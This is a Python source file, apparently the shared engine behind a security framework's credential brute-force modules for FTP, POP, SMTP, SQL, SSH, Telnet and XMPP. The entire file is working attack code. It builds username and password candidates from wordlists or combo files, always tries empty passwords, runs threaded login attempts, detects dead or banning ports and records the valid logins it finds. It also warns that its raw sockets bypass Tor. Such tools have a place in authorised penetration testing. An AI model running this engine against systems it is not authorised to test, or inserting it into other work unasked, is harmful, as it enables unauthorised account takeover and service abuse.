#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shared credential-bruteforcing engine for the Brute Force Tools modules
(ftp/pop/smtp/sql/ssh/telnet/xmpp).

A protocol module supplies only a `try_login` callback and its defaults;
this engine owns everything else: option parsing, credential lists,
bounded concurrency, progress, abort-on-dead-port and result recording.

The callback contract
---------------------
    try_login(ip, port, user, password, timeout) -> bool
        return True  -> credentials are valid
        return False -> the server answered and rejected them (auth failure)
        raise  ConnectionError (or subclass) -> could not talk to the server
               (port closed, TLS handshake failed, account locked out, the
               server dropped us). These are NOT counted as auth failures;
               after a run of them against a dead/º banning port the engine
               aborts instead of hammering it.

Any other exception from the callback is treated like a ConnectionError
(the backend misbehaved) and remembered so the final message can show it.

These backends open raw TCP sockets (ftplib / poplib / smtplib / paramiko /
PyMySQL / plain sockets) which do NOT honour `tor on`; the engine warns.
"""

from __future__ import annotations

import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import Callable, List, Optional

import core.variables as variables
from core.methods import modkit as kit

CLEAR_LINE = "\r\033[K"

# Give up on a port that only ever refuses the connection after this many
# consecutive transport errors without a single successful conversation.
CONN_ERROR_LIMIT = 6

# Hard ceiling on worker threads regardless of the THREADS option: auth
# services ban fast, so we never fan out wide.
MAX_THREADS = 16

TryLogin = Callable[[str, int, str, str, float], bool]


def options(port_default: int, threads_default: int = 4,
            extra: Optional[dict] = None) -> dict:
    """Standard Brute Force Tools option set for a protocol module.

    `extra` adds protocol-specific switches (e.g. FTP_TLS).
    """
    opts = {
        "IP": ["Target IP (defaults to the resolved target)", ""],
        "PORT": ["Service port", str(port_default)],
        "USERS": ["Username wordlist (blank = protocol default)", ""],
        "PASSWORDS": ["Password wordlist (blank = protocol default)", ""],
        "COMBO": ["user:pass combo file (overrides USERS/PASSWORDS)", ""],
        "THREADS": ["Concurrent attempts (capped at 16)", str(threads_default)],
        "DELAY": ["Delay between attempts in seconds", "0"],
        "TIMEOUT": ["Socket timeout in seconds", "8"],
        "STOP": ["Stop at the first valid login (y/n)", "y"],
    }
    if extra:
        opts.update(extra)
    return opts


@dataclass(frozen=True)
class Credential:
    user: str
    password: str

    def __str__(self) -> str:
        shown = self.password if self.password else "<empty>"
        return f"{self.user}:{shown}"


def _load_pairs(properties: dict, proto: str) -> List[Credential]:
    """Build the candidate credential list.

    A COMBO file (``user:password`` per line) wins outright. Otherwise the
    cartesian product of USERS x PASSWORDS is used. An empty password is
    always tried as well (a classic default, e.g. MySQL root).
    """
    combo_path = kit.option(properties, "COMBO",
                            f"{proto.upper()} user:pass combo file (blank to skip)", "")
    if combo_path:
        pairs: List[Credential] = []
        for line in kit.wordlist(combo_path):
            if ":" in line:
                user, password = line.split(":", 1)
                pairs.append(Credential(user, password))
        return list(dict.fromkeys(pairs))

    base = f"files/brute-db/{proto}"
    user_path = kit.option(properties, "USERS", f"{proto.upper()} username list",
                           f"{base}/{proto}_defuser.lst")
    pass_path = kit.option(properties, "PASSWORDS", f"{proto.upper()} password list",
                           f"{base}/{proto}_defpass.lst")
    users = kit.wordlist(user_path)
    passwords = kit.wordlist(pass_path)
    if not passwords or "" not in passwords:
        passwords = [""] + passwords        # always try the empty password
    pairs = [Credential(u, p) for u in users for p in passwords]
    return list(dict.fromkeys(pairs))


@dataclass
class _State:
    lock: threading.Lock
    stop: threading.Event
    conn_errors: int = 0
    talked: bool = False          # at least one real server conversation
    dead: bool = False            # port looks closed / unreachable
    last_error: str = ""


def run(target, properties: dict, *, proto: str, port_default: int,
        try_login: TryLogin, lvl2: str, threads_default: int = 4,
        service: Optional[str] = None) -> List[Credential]:
    """Full module flow: options, credential list, attack loop, record.

    Returns the list of valid credentials found (possibly empty).
    """
    service = service or proto.upper()
    rec = kit.Recorder(target, kit.BRUTE, lvl2)

    ip = kit.option(properties, "IP", f"Target IP for {service}", kit.resolve(target))
    if not ip:
        kit.bad("Could not resolve a target IP; set the IP option.")
        rec("No valid credentials found (target did not resolve).")
        return []

    port = kit.integer(properties, "PORT", f"{service} port", port_default)
    timeout = kit.number(properties, "TIMEOUT", "Socket timeout (seconds)", 8.0)
    delay = kit.number(properties, "DELAY", "Delay between attempts (seconds)", 0.0)
    threads = kit.integer(properties, "THREADS", "Concurrent attempts", threads_default)
    threads = max(1, min(threads, MAX_THREADS))
    stop_first = kit.flag(properties, "STOP", "Stop at the first valid login", True)

    if getattr(variables, "tor", False):
        kit.warn(f"{service} brute force opens a raw socket and does NOT go through Tor.")

    pairs = _load_pairs(properties, proto)
    if not pairs:
        kit.bad("No credentials to try (empty username/password lists).")
        rec("No valid credentials found (no credentials loaded).")
        return []

    kit.info(f"Trying {len(pairs)} credential pairs against {ip}:{port} "
             f"({threads} thread{'s' if threads > 1 else ''})")

    state = _State(lock=threading.Lock(), stop=threading.Event())
    hits: List[Credential] = []
    hits_lock = threading.Lock()
    total = len(pairs)
    done = 0
    progress = sys.stdout.isatty()

    def attempt(cred: Credential) -> None:
        nonlocal done
        if state.stop.is_set():
            return
        error: Optional[str] = None
        ok = False
        try:
            ok = bool(try_login(ip, int(port), cred.user, cred.password, timeout))
        except (ConnectionError, socket.error, socket.timeout, OSError) as e:
            error = f"{type(e).__name__}: {e}"
        except Exception as e:  # misbehaving backend: treat as transport error
            error = f"{type(e).__name__}: {e}"

        with state.lock:
            done += 1
            if error is not None:
                state.conn_errors += 1
                state.last_error = error
                if not state.talked and state.conn_errors >= CONN_ERROR_LIMIT:
                    state.dead = True
                    state.stop.set()
            else:
                state.talked = True
                state.conn_errors = 0
            current = done

        if error is None and ok:
            with hits_lock:
                hits.append(cred)
            if progress:
                print(CLEAR_LINE, end="")
            kit.good(f"Valid {service} login: {cred.user} : "
                     f"{cred.password if cred.password else '<empty password>'}")
            if stop_first:
                state.stop.set()
        elif progress and not state.stop.is_set():
            print(f"{CLEAR_LINE} [*] {current}/{total} tried", end="", flush=True)

        if error is None and delay and not state.stop.is_set():
            time.sleep(delay)

    try:
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for cred in pairs:
                if state.stop.is_set():
                    break
                pool.submit(attempt, cred)
    except KeyboardInterrupt:
        state.stop.set()
        if progress:
            print(CLEAR_LINE, end="")
        kit.bad("Interrupted.")

    if progress:
        print(CLEAR_LINE, end="")

    if state.dead:
        kit.bad(f"{service} port {ip}:{port} is unreachable "
                f"({state.last_error or 'connection refused'}); aborted.")
        rec(f"No valid credentials found ({service} port unreachable).")
        return []

    if hits:
        kit.good(f"{len(hits)} valid {service} credential(s) found.")
        rec([f"{c.user} : {c.password or '<empty>'}  ({service} on {ip}:{port})"
             for c in hits])
    else:
        note = f" (last transport error: {state.last_error})" if state.last_error else ""
        kit.bad(f"No valid {service} credentials found.")
        rec(f"No valid credentials found.{note}")
    return hits


def connect_check(ip: str, port: int, timeout: float) -> None:
    """Raise ConnectionError unless a plain TCP connect to ip:port succeeds.

    Helper for callbacks that want to distinguish a closed port from an
    auth failure before using a higher-level client.
    """
    try:
        with socket.create_connection((ip, int(port)), timeout=timeout):
            return
    except OSError as e:
        raise ConnectionError(str(e)) from e
